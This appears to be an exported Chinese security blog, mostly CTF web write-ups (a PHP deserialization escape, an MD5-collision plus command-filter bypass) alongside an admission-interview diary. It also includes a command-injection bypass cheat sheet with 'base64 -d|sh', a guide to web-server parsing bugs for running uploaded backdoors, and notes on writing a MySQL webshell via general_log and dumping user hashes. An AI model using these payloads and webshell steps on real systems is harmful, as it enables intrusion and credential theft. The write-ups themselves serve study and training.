preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;$_SESSION[&#39;function&#39;] &#x3D; $function;extract($_POST);if(!$function)&#123; echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123; $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);&#125;else&#123; $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info &#x3D; filter(serialize($_SESSION));if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123; highlight_file(&#39;index.php&#39;);&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123; eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123; $userinfo &#x3D; unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125; 题目分析大概的流程是从浏览器接受GET方式的function，根据提示在phpinfo里面有东西。 进入phpinfo后搜索得到 d0g3_f1ag.php这个文件，于是猜测需要通过反序列化构造执行至程序最后一行的file_get_contnets(). 那么看file_get_contents()是对 经过滤后、序列化后的serialize_info的反序列化取其img属性的结果。 先不管正则过滤，我们的目的是构造一个输入，让img的value为base64加密后的d0g3_f1ag.php。 目标结果如下： 1a:3:&#123;s:4:&quot;user&quot;;s:5:&quot;guest&quot;;s:8:&quot;function&quot;;s:14:&quot;highlight_file&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 但是正常输入的话我们是无法绕过 img_path 的判定的。 所以这里根据过滤入手，根据正则表达式以及preg_repace我们可以知道，将一些关键字替换成了无，即去掉。 这里我们可以使用POST方法，对_SESSION[]数组传参，传入的key为黑名单的值，这样在序列化完之后会吃掉该key的部分value。 听不懂正常，一开始我也听不懂，我就不像其他博主一样给你用不同的颜色标出来哪里是吃掉的部分了。 首先要了解php序列化后的语法（这里不赘述） 我们先随便写写，先POST个_SESSION[flag]=s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;} 看看结果是什么（把代码拷贝到本地，然后本地运行，echo或者var_dump出来序列化后的结果）： a:2:{s:4:””;s:39:”s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;} 但是这样是不能正常反序列化的，因为不符合反序列化的语法规则。根据语法规则知道，如果我们想让img作为key，base64加密后的东西作为value的话，需要让上一个对象是正常的，符合序列化后的字符串的语法。 从前往后看，第一个对象的key为**”;s:**，这样会导致后面的字符串无法正常地反序列化。 所以，接下来需要做的是先把第一个对象的key和value补全，让其能正常地反序列化。 补全第一个key的话，需要让第一个key为**”;s:39:”**，所以需要在POST里面传入_SESSION[flagflag]，这样能吞掉八个位置。正好能让本段话加粗的内容作为第一个key（这里建议自己写写试试，看看是否符合反序列化语法的规则。） 补全之后请大家自己var_dump或者输出，我这里不会给出补全后输出的序列化结果。 补全后发现，第一个对象可以正常序列化了，但是问题就是第二个对象的key成了第一个对象的value。 所以这里需要给第一个对象补个key，给_SESISON[flagflag]继续传值就可以，具体传什么，为什么要这样传，我也不会说。总之我们的目的是传一个符合序列化格式的value，并且传入后也需要让前后都符合序列化格式。 随便写一个就好 比如 s:3:”aaa”; 首先你把他写进去，然后根据序列化格式在前后添加相关符号。连同刚才写的s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}一起就是_SESSION[flagflag]= s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;} 现在放进去看看是什么效果。是否能够正常反序列化 a:2:{s:8:””;s:46:”s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;}”;s:3:”img”;s:20:”Z3Vlc3RfaW1nLnBuZw==”;} 这样发现还是不能正常地反序列化，因为不符合语法。在s:3前缺少上一个字段的闭合”; 加上就好。 所以最终的payload就是 _SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;} 打过去后查看源码，发现 12345&lt;?php$flag = &#x27;flag in /d0g3_fllllllag&#x27;;?&gt; 下面继续打对应的文件就好了~ _SESSION[flagflag]=”;s:3:”aaa”;s:3:”img”;s:20:”L2QwZzNfZmxsbGxsbGFn”;} 打进去即可获得一枚flag。","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://polosec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"安洵杯web","slug":"安洵杯web","date":"2020-10-30T16:11:37.000Z","updated":"2020-10-30T16:12:16.345Z","comments":true,"path":"2020/10/31/安洵杯web/","link":"","permalink":"https://polosec.github.io/2020/10/31/%E5%AE%89%E6%B4%B5%E6%9D%AFweb/","excerpt":"","text":"致谢https://www.cnblogs.com/Cl0ud/p/12585242.html 题目分析打开题目，观察URL为http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd= 于是猜测有个文件读取和命令执行，但是文件读取的格式是加密的，考虑base64解密，解密两次后再hex2ascii，可以得到文件名。 copy大佬的脚本，输入文件名即可得到根据此加密规律加密后的文件名： 123456789import binasciiimport base64filename = input().encode(encoding=&#x27;utf-8&#x27;)hex = binascii.b2a_hex(filename) #b2a是返回二进制数据的16进制表示print(hex)base1 = base64.b64encode(hex)base2 = base64.b64encode(base1)print(base2.decode()) 输入index.php后可以得到index.php文件名的加密后的名字，放到img里面查看源代码为base64加密的，把base64解密后即可得到index.php的源代码 index.php源码如下： 123456789101112131415161718192021222324252627282930313233343536&lt;?phphighlight_file(__FILE__);error_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);$cmd &#x3D; $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?img&#x3D;TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd&#x3D;&#39;);$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;])));$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123; echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;; die(&quot;xixi～ no flag&quot;);&#125; else &#123; $txt &#x3D; base64_encode(file_get_contents($file)); echo &quot;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#39;|\\&quot;|\\&#96;|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; md5($_POST[&#39;b&#39;])) &#123; echo &quot;success&quot;; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt;&lt;html&gt;&lt;body&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 对源码进行审计，重点在命令执行部分。 命令执行有很多过滤，这里过滤不完全（正则表达式有待学习），可用ca\\t%20fl\\ag绕过。 在命令执行前需要满足 1if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) 这里可以考虑fastcoll构造两个hash值相同的二进制文件。 我这里构造好了，具体的使用方法可以百度fastcoll。 使用该软件构造好后，使用如下php脚本可以获得urlencode后的md5值： 12345678910111213141516171819&lt;?php function readmyfile($path)&#123; $fh &#x3D; fopen($path, &quot;rb&quot;); $data &#x3D; fread($fh, filesize($path)); fclose($fh); return $data;&#125;echo &#39;二进制hash &#39;. md5( (readmyfile(&quot;1.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;URLENCODE &#39;. urlencode(readmyfile(&quot;1.txt&quot;));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;URLENCODE hash &#39;.md5(urlencode (readmyfile(&quot;1.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;二进制hash &#39;.md5( (readmyfile(&quot;2.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;URLENCODE &#39;. urlencode(readmyfile(&quot;2.txt&quot;));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;;echo &#39;URLENCODE hash &#39;.md5( urlencode(readmyfile(&quot;2.txt&quot;)));echo &quot;&lt;br&gt;&lt;br&gt;\\r\\n&quot;; 下面将这两个MD5值分别给POST的a和b赋值，同时URL的?cmd=ca\\t%20fl\\ag 这里我踩了个坑，一开始是GET方式提交请求，然后手动改方法为POST，一直不能成功，后来发现可能是某些请求头的问题，我这里用hackbar发送POST请求，请求体随便写，在BP里面抓包，将请求体的内容改成a和b的值，在此之后即可愉快地命令执行。 payload: 123a=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%23%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%09s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%88%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6G%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99%E4%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%5C%2A%9A%E7%CC&amp;b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%A3%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%89s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%08%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6%C7%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99d%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%DC%2A%9A%E7%CC 请求包: 123456789101112131415POST /index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=ca\\t%20/fl\\ag HTTP/1.1Host: 31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cnContent-Length: 1029Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cnContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://31d9d742-c1f3-428c-860d-b09b30c2b2d9.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: closea=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%23%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%09s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%88%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6G%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99%E4%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%5C%2A%9A%E7%CC&amp;b=1%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%3B%11%1B%7E%CD%C3%A0h4E%95%0E%CC%BBq%7E%C2U%DF%A3%92X%29%5D6%AA%3F%1E%D3%CC%9C%04v%E4%CA%E2%EA%EC%84%0Bk%24nC%C5%89s%B1%ADQ%9E%26%0C%FC%95%90%D9%04X%08%FAD%EA%2A%AFI%B2R%D3%EAQ%A6.rJ%E5%9A%94%97%3Cx%D1%A6%C7%F7UGL%10%C9%F4v%CE%B6%80%9E%9D%EF3%C6%26Q%94h%C2G%F5%B9%99d%A4%DD%D4%8C%3B%3D%B8%CE%13%A7%5B%D8%99%DC%2A%9A%E7%CC 响应包如下图： 总结好久没刷web了，太菜了，这道题一开始没思路，看着师傅们的wp复现出来的，踩坑踩了大概一个小时。","categories":[],"tags":[]},{"title":"山东省网络技术大赛-网络安全赛道初赛第二场wp","slug":"山东省网络技术大赛-网络安全赛道初赛第二场wp","date":"2020-10-19T04:10:22.000Z","updated":"2020-10-19T04:10:38.695Z","comments":true,"path":"2020/10/19/山东省网络技术大赛-网络安全赛道初赛第二场wp/","link":"","permalink":"https://polosec.github.io/2020/10/19/%E5%B1%B1%E4%B8%9C%E7%9C%81%E7%BD%91%E7%BB%9C%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%B5%9B%E9%81%93%E5%88%9D%E8%B5%9B%E7%AC%AC%E4%BA%8C%E5%9C%BAwp/","excerpt":"","text":"写在前面组委会太逆天了，pwn环境挂了，群里没人理的 web进入首页有个提示，查看源码后psw.php 1234567891011121314151617181920212223242526&lt;?php highlight_file( __FILE__ ); function encode($string,$option=&#x27;encode&#x27;)&#123; if ($option==&#x27;encode&#x27;) &#123; $lenght=strlen($string); for ($x=0;$x&lt;$lenght;$x++) &#123; @$tmp=substr($string,$x,1); $ord=ord($tmp)+10; @$result=$result.chr($ord); &#125; echo $result.&#x27;&lt;/br&gt;&#x27;; &#125;elseif($option==&#x27;decode&#x27;)&#123; &#125; &#125; encode(&#x27;_Y^kdg_k&#x27;,&#x27;decode&#x27;); ?&gt; 把这段代码放到本地用phpstudy跑起来，最后调用时decode换成encode，跑出来个密码，为ichunqiu，输入到首页即可获得flag misc一张图片，直接stegsolve 往右点，有一张二维码 扫下来base32解密即可得到flag。","categories":[],"tags":[]},{"title":"网络安全专业-夏令营/预推免面经","slug":"面经","date":"2020-10-11T16:34:55.000Z","updated":"2021-01-26T10:02:17.684Z","comments":true,"path":"2020/10/12/面经/","link":"","permalink":"https://polosec.github.io/2020/10/12/%E9%9D%A2%E7%BB%8F/","excerpt":"","text":"写在前面现在是2020年10月12日下午18点19分，我于今天上午收到了来自电子科技大学的录取通知，确定后，意味着保研之旅正式结束。 在这长达一年的准备时间里，感谢父母、家人、学校、学院对我的支持，感谢保研前辈对我的指点，感谢朋友们为我提供信息，加油鼓劲。 夏令营和预推免情况夏令营申请学校：30+所985，211学校，只有山大、中海洋、中央财经、国防科大电子对抗学院通过了初审。 夏令营通过学校：中海洋专硕、国防科大电子对抗学院 网络安全 学硕，其中拒绝了中央财经的面试。 预推免申请学校：山大、天大、电子科大、西北工业大学、哈工大、复旦、西电等。 预推免通过学校：山大网安学硕、天大网安学硕、电子科大网安学硕（其中拒绝了西北工大、西电面试） 最终去向：电子科技大学-计算机学院-网络空间安全-学硕 ，张小松教授团队 ，研究方向：云计算与IOT安全。 个人情况介绍背景简述GPA:4.1/5.0（专业1/49）; CET-4:540; CET-6:548; 一篇国家级普刊，美赛一等奖，蓝桥杯省二，两次校一等奖学金、山东省政府奖学金、数次CTF竞赛经历。 一段专业短期实习经历，两个小项目。（全部专业高度相关） 详细介绍我来自山东省一所一本学校——曲阜师范大学，本科背景通俗地讲叫做“双非”。 我自初中起对网络安全技术感兴趣，一直在断断续续地摸索，大学选择了软件工程专业，算是正式进入计算机行业科班。 大一没有特别认真学习，GPA为3.8/5，暑假有一段香港访学经历，无校级以上奖项。 大一从香港回来后，励志去港校，经咨询后GPA对我来说至少要4以上，于是大二开始每天认真学习专业知识，泡自习室。大二通过了四六级考试，四级540，六级第一次501。拿到了蓝桥杯编程山东省二等奖（水），随师哥去外省参加了两次CTF线下赛（划水），没什么成绩。大二最终GPA为4.01，大二学年GPA为4.32，全年级最高。 大三在师哥的建议下决定尝试保研，于是开始从公众号了解相关政策信息，一开始也是懵懂无知的状态，知道了需要准备简历、项目、竞赛、论文、四六级。 保研准备大三上学期通过了六级考试，在严格的模拟训练下拿到了548分，还算满意。由于疫情原因在家耽误了一段时间，过年那段时间主要在家学保研课，了解如何写个人简历、自我介绍、自我陈述、学校申请等相关流程。 2020年2月份与两位数学的队友一起参加了美国大学生数学建模竞赛，我基本负责除了写论文和建模外的其他内容。（我是辅助），最终拿了国际一等奖的成绩，这与我两位队友的努力是分不开的，致谢。 2020年2月份大致准备好了简历、自我介绍（中英文，长短各一份，共四份）、个人陈述、推荐信、证书证件扫描等文书工作。简历的完善工作一直到最后一次面试前，约四五十次大大小小的修改吧。 2020年三月份成功投稿了我在一月份开始写的一篇期刊，投稿至国家级普刊，期间学习了很多知识。 2020年三月开始正式打CTF、学习CTF知识，写博客。 2020年4月完成了基于flask框架的图书管理系统（一个很小的项目，总共就四五百行代码）四月份开始了解专业前景，向各位前辈以及知乎、交流群里打听专业强校、强老师。 2020年5月完成了基于Nmap和Masscan扫描器的Web扫描器，并改进了CTF-wscan扫描器（主要是优化了多线程与重复扫描问题，当然目前还存在一些bug）。五月份开始联系导师，其中有一位南方学校的老师为我提供了一次宝贵的实习机会。在此向魏老师致谢。 2020年6月在老师的推荐下赴广州进行实习，职位是渗透测试工程师。两个月的实习期间主要是学会了一些思路与工具，收获了一些好友与人脉。期间也在不断地投递简历与联系老师。六月底通过了中海洋、山大的初审。 2020年7月拿到了中海洋优营，国防科大电子对抗学院录取范围第二名，参加电子科技大学导师团队面试并通过，与此同时继续实习。 2020年8月通过了深信服北京安全研发中心实习生两轮技术面，因学校时间冲突原因放弃hr面。 2020年9月通过北京hw蓝队面试，薪资是最低的1.3k一天包吃住（彩笔）、通过了天大复试，拿到了学硕offer 2020年10月通过电子科大、山大复试，拿到本校推免资格，拿到学硕offer并上岸。 劝告保研是一场信息战，但要学会如何获取有用、有价值的信息，学会交朋友，有时候外校朋友的信息能决定你的命运 联系老师很重要，你会发现我所有入营且拿到offer的学校都提前联系了老师。 夏令营面经由于夏令营都在卷，入营非常少，山大是报名的全入营了，没有参考价值。 下面按照时间顺序来说 中国海洋大学 信息学院中海洋第一个面试，我提前联系了老师，老师人很好，在信息学院做安全算是比较好的老师了，邮件联系后，正好老师负责夏令营审批，给了我入营资格。今年中海洋计算机夏令营初审报了四百多，可想而知。 在入营后有一个热身活动，选定一个方向以及问题，对这个问题展开研究并写论文和ppt录屏五分钟内汇报。我选的是系统安全的问题，meltdown，防御方法有KASLR等。 面试前一晚有个机试，据说机试不算成绩里面，但是面试官会有机试的成绩。大概题目都是些比较简单的格式输入输出，算平均分之类的，最后一个是类似矩阵转置输出。。没写上来草。 面试大概是上来先抽题 我抽到了简述计算机网络OSI七层模型，然后就是老师提问，问我极限编程的概念。。。不会；问我MIPS了解多少。。。不会；问我ACID ，说了AID忘了C的含义是啥了。。。尴尬；最后等了一周给了专硕。 山东大学 网络空间安全学院SDU网安是我比较想去的一个学校，有想跟的老师，可惜那位老师不要我，当然，还有一位想跟的老师，那位老师人很好，我也提前和他联系了。 夏令营山大网安面试120个人收17个优营，包括6个左右的本校.. 面试当天问我对密码学有多少了解，我说了解过对称、非对称加密，在蚁剑加密流量分析中用过。然后问我了解过哪些系统安全方面的漏洞，我说meltdown，我说本科主要是做web方向，老师说希望我以后多了解系统安全的知识。（其他细节记不太清了 夏令营印象不是太深刻） 最后优营当然没我啥事 国防科技大学 电子对抗学院NUDT电抗我先联系了一位教授，如沐春风的感觉，给人一种和蔼可亲的感觉，在和地方生学长交流的时候得知该老师水平很高，要求严格，不缺学生，我也很荣幸他能相中我。 在面试的时候设备问题，一直吱吱啦啦对面听不清，进行英文自我介绍的时候被迫叫停。后面简单问了问项目、实习和美赛经历，重点问了美赛里面我承担的工作，并问了主要是谁翻译的。 最后考核结果夏令营录取名额网安为10个，我排第二，免预推免复试。 中央财经大学 信息学院没去面试 西北工业大学 网络空间安全学院没去面试 预推免面经预推免的bar明显低了不少。 电子科技大学 导师面试电子科技大学在七月下旬提前联系导师，参加了导师团队面试。一共大概三四位老师，首先用中文简单地介绍了自己，问我的项目写了多少行代码，是不是自己写的，问我的扫描器能否在扫描速度很快的情况下扫描完所有目标URL，问ZOOMEYE\\FOFA\\SHODAN等空间测绘引擎的区别是什么（主要看着简历问），问了问我美赛的获奖比例以及负责的工作。最后问了我校是否985211，数小时后被通知通过团队面试，经过学院面试后可直接报老师。 天津大学 智能与计算学部天大我先联系了一位老师，这位老师的研究方向和我非常符合，老师也很明确地想要我，但是夏令营卡985211，所以我没进去，等预推免才进去的。 面试首先是一分钟的英文自我介绍，介绍过后讲一下自己准备的PPT（可以中文再介绍一下）然后讲一个你认为最重要的项目（我当时听错了，我以为是不限科研经历，只限一个项目，所以我一共讲了三个，面试老师有些不太高兴），最后问了问我的论文是怎么写的，创新点在哪里。结束面试 最后给了网安学硕，非常非常感谢许老师。 山东大学 网络空间安全学院和老师联系过后我觉得去山大专硕还是比较有希望的，于是报了山大的预推免，比较晚，面试在8号。 面试首先是一轮拷问，还是问我美赛负责的工作、问我本科做什么方向，说我本科打web，研究生方向不太一样。然后有个老师用英文让我描述一下我的数据可视化项目，还有一位老师问了KASLR的作用以及原理。。原理没说上来，还是这位老师，问了我的论文创新点在哪里，有没有自己的新东西….一针见血。。果然不一般。 最后想着能有专硕就行了，结果老师帮我递补了学硕，感谢sdu，感谢郭老师。 电子科技大学 计算机科学与工程学院UESTC是我最后一战，非常紧张。 面试首先是三分钟的PPT自我介绍，介绍了学术背景、科研经历、项目经历。 然后是抽题 ，抽到的题是描述算法，如何找出两个stirng的公共字符。 接下来是英文问题，describe a project 和 why choose our school? 都比较简单，老考点了。 下面就开始拷问了，专业知识问了软件测试的四个过程，黑盒测试和白盒测试的区别，因为我本科是软件工程，问我凭什么报信息安全（？）我说我自己本科主动学习相关知识等。 安全开发的经历、这个短期实习你觉得你都收获了什么东西？ 美赛主要负责哪些内容？ 接下来老师问我更偏向纯技术还是部分技术+social，我选择了前者。 最后老师问我目前的主攻方向是什么，我BB了一堆打太极，最后老师又问，我破防了，遂说Web安全/渗透测试。 总结保研既有实力也有运气，祝大家好运。 不能保证好运的前提下请尽量提升自我，因为在面试中不一定会遇到什么问题，请完善简历，务必对简历上的每一个问题都熟悉。 当你觉得晚了的时候开始，恰恰是最早的时候，现在开始，一切不晚。 学会社交，学会问问题，学会和老师沟通交流，决定鸽的时候要尽量尽早，就算不能早鸽也一定提前和老师说明情况，大多数老师会理解。一定处理好和学校的关系，这不仅关乎你，更关乎你的学弟学妹。 联系方式个人VX:ab444o 欢迎师弟师妹交流保研相关问题~","categories":[],"tags":[]},{"title":"解析漏洞小结","slug":"解析漏洞小结","date":"2020-06-20T14:49:06.000Z","updated":"2020-06-20T15:14:07.769Z","comments":true,"path":"2020/06/20/解析漏洞小结/","link":"","permalink":"https://polosec.github.io/2020/06/20/%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/","excerpt":"","text":"参考链接:https://www.jianshu.com/p/a1fa305a6b8f IIS5/6解析漏洞目录解析:在网站下建立文件夹的名称中带有.asp、.asa等可执行脚本文件后缀为后缀的文件夹，其目录内的任何扩展名的文件都被IIS当作可执行文件来解析并执行。比如 www.baidu.com/1.asp/1.jpg文件解析:在IIS6.0下，分号后面的不被解析，也就是说6.0下，分号后面的不被解析，也就是说xx.asp;.jpg将被当做xx.asp解析并执行。http://www.xxx.com/xx.asp;.jpgIIS6.0 默认的可执行文件有asp、asa、cer、cdx四种。 IIS 7.0/IIS 7.5/ Nginx &lt;0.8.3畸形解析漏洞在默认Fast-CGI开启状况下,在一个文件路径(/xx.jpg)后面加上/xx.PHP会将 /xx.jpg/xx.php 解析为 php 文件。常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾 Nginx &lt;=0.8.37 解析漏洞00截断在Fast-CGI关闭的情况下，Nginx &lt;=0.8.37 依然存在解析漏洞在一个文件路径(/xx.jpg)后面加上%00.php会将 /xx.jpg%00.php 解析为 php 文件。 Apache 解析漏洞后缀解析：test.php.x1.x2.x3Apache将从右至左开始判断后缀，若x3非可识别后缀，再判断x2，直到找到可识别后缀为止，然后将该可识别后缀进解析test.php.x1.x2.x3 则会被解析为php","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"命令执行绕过(ping ping ping)","slug":"ping-ping-ping","date":"2020-06-20T13:14:50.000Z","updated":"2020-06-20T13:37:33.955Z","comments":true,"path":"2020/06/20/ping-ping-ping/","link":"","permalink":"https://polosec.github.io/2020/06/20/ping-ping-ping/","excerpt":"","text":"页面给了个ip，考虑ping命令的命令执行。这里过滤的内容比较多，过滤了空格，而且有些空格绕过方法也用不了。这里绕过空格用的是$IFS$9接下来尝试cat flagflag字段也被过滤了，尝试使用通配符也不行，*也不行，[]符号也被过滤了。接下来尝试base64编码。echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh 可行还有一种方法是cat 反引号里面的内容--- 或$() 会引用命令被执行后的结果。?ip=127.0.0.1;cat$IFS$9ls还有一种方法就是拼接：?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php这样也可以绕过。补充空格绕过：{cat,1.txt}关键字过滤绕过：反斜杠 ca\\t、变量代换、编码、 echo xxxx | base64 -d|sh/bash、引号c’a’t命令分隔与执行多条命令1.&amp;&amp; 表示将任务置于后台执行2.&amp;&amp;只有在 &amp;&amp; 左边的命令返回真（命令返回值 $? == 0），&amp;&amp; 右边的命令才 会被执行。3.|| 表示管道，上一条命令的输出，作为下一条命令的参数4.||只有在 || 左边的命令返回假（命令返回值 $? == 1），|| 右边的命令才 会被执行。5.；多行语句用换行区分代码快，单行语句一般要用到分号来区分代码块","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"https://polosec.github.io/tags/ctf/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"}]},{"title":"面试问题整理","slug":"面试问题整理","date":"2020-06-19T15:16:01.000Z","updated":"2020-06-20T10:53:47.876Z","comments":true,"path":"2020/06/19/面试问题整理/","link":"","permalink":"https://polosec.github.io/2020/06/19/%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/","excerpt":"","text":"本文不间断地记录面试遇到的问题，希望能对自己有个警醒，对后辈有所作用。 MySQL写Webshell的条件1.知道网站绝对路径2.有对网站绝对路径的写权限 select @@basedir;3.没有配置secure_file_priv 或者其为空4.GPC关闭（默认关闭）secure_file_priv已经设置的话，可以通过修改日志文件到网站根目录，然后通过包含的方式写shell流程：首先找到日志存放位置：接下来设置general_log 为on：set global general_log = on;接下来把日志文件修改为网站绝对目录下的某个文件 比如set global general_log_file =’/var/www/html/shell.php’;接下来select 即可记录到日志文件中，在URL中访问日志文件即可。这里需要注意一个问题，如果目标站点数据库访问频繁的话可能日志文件会很大，连shell会很卡，所以拿到该shell后重新再传一个隐蔽点的shell，再把日志文件改回去，关闭日志记录的功能。 mysql常用查询select @@version; 查询数据库版本select @@basedir; 查询MYSQL安装路径select @@plugin_dir ; 查看plugin路径select host, user, password from mysql.user; 查询hash (MySQL &lt;= 5.6 )select host, user, authentication_string from mysql.user; 查询hash (MySQL 